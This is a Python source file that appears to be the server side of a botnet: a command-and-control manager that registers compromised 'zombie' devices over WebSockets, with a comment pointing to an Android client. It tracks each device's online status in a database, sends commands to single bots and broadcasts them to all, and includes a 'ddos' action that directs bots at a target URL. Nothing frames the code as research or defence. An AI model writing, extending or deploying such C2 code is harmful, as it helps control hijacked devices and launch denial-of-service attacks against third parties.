import asyncio
from typing import Dict

from sqlalchemy import select
from starlette.websockets import WebSocket

from apps.zombie.models import Zombie
from config.database import async_session_maker


class C2Manager:
    def __init__(self):
        self.zombies: Dict[str, WebSocket] = {}
        self.terminal_queues: Dict[str, asyncio.Queue] = {}

    async def connect(self, zombie_id: str, websocket: WebSocket, ) -> None:
        await websocket.accept()
        self.zombies[zombie_id] = websocket

        try:
            async with async_session_maker() as session:
                query = select(Zombie).where(Zombie.id == int(zombie_id))
                result = await session.execute(query)
                zombie = result.scalar_one_or_none()
                if zombie:
                    zombie.status = "online"
                    await session.commit()
            await websocket.send_json({
                "success": True,
                "zombie_id": zombie_id,
                "text": "Welcome to Zombie!"
            })
            print(f"[+] Zombie {zombie_id} is now online.")
        except Exception as e:
            print(e)

    async def disconnect(self, zombie_id: str) -> None:
        if zombie_id in self.zombies:
            del self.zombies[zombie_id]
        try:
            async with async_session_maker() as session:
                query = select(Zombie).where(Zombie.id == int(zombie_id))
                result = await session.execute(query)
                zombie = result.scalar_one_or_none()
                if zombie:
                    zombie.status = "offline"
                    await session.commit()
                await self.send_command(zombie_id, {'action': 'disconnect'})
                print(f"[-] Zombie {zombie_id} disconnected.")
        except Exception as e:
            print(f"[!] DB Error during disconnect for {zombie_id}: {e}")

    async def send_command(self, zombie_id: str, command: dict) -> bool:
        # 1. Safely retrieve the WebSocket connection
        ws = self.zombies.get(zombie_id)
        
        if not ws:
            print(f"[!] Send failed: Zombie {zombie_id} is not connected (offline).")
            return False

        try:
            # 2. Use .get() with a default to avoid KeyError
            action = command.get('action')
            
            if action != 'ddos':
                # Note: Ensure Android client expects "cmd" and "command_id"
                payload = {
                    "action": action,
                    "cmd": command.get("command_type"),
                    "command_id": str(command.get("command_id"))
                }
            else:
                payload = {
                    "action": "ddos",
                    "url": command.get("url"),
                }

            await ws.send_json(payload)
            return True

        except Exception as e:
            # 3. Log the actual communication error
            print(f"[!] WebSocket Error sending to {zombie_id}: {e}")
            return False

    async def get_terminal_queue(self, zombie_id: str):
        if zombie_id not in self.terminal_queues:
            self.terminal_queues[zombie_id] = asyncio.Queue()
        return self.terminal_queues[zombie_id]

    async def broadcast(self, command: dict) -> None:
        for zid in self.zombies:
            await self.send_command(zid, command)


c2_manager = C2Manager()
